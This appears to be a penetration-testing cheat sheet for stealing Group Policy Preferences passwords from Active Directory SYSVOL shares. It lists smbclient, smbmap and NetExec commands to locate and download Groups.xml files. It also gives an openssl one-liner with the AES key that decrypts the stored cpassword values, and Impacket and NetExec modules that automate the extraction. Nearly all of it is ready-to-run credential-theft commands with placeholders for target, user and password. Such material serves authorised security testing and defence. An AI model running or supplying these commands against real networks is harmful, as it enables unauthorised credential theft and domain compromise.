# Unix Shell

## 01 - Manual

### 1.1 - Samba Suite Utils

Authentication syntax.

```
$ smbclient -U "<username>%<password>" //<IP>/SYSVOL

$ smbclient -U "<username>" --password="<password>" //<IP>/SYSVOL
```

Retrieve XML files recursively.

```
smb: \> cd <domain_name>/Policies

smb: \> recurse on

smb: \> prompt off

smb: \> mget *.xml
```

### 1.2 - SMBMap

```
$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> -F "Groups.xml" --search-path "SYSVOL\"

$ smbmap -u "<username>" -p "<password | nt_hash>" [-d <domain>] -H <IP> --download "SYSVOL\path\to\remote\Groups.xml"
```

### 1.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] --spider SYSVOL --pattern Groups.xml

$ netexec smb -u "<username>" -p "<password>" [-d <domain> | --local-auth] --get-file /path/to/remote/Groups.xml
```

## 02 - Extract Credentials

### 2.1 - Manual

```
$ basenc --base64 -d <<< '<base64_encoded_password>' | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000
```

### 2.2 - Impacket

```
$ Get-GPPPassword.py [<domain>/]<username>:"<password>"@<IP>

$ Get-GPPPassword.py [<domain>/]<username>@<IP> -hashes :<nt_hash>
```

### 2.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" [-d <domain> | --local-auth] -M gpp_autologin

$ netexec smb -u "<username>" -p "<password>" [-d <domain> | --local-auth] -M gpp_password
```

---
## References

 - [VK9 Security: Exploiting GPP SYSVOL (Groups.xml)](https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/)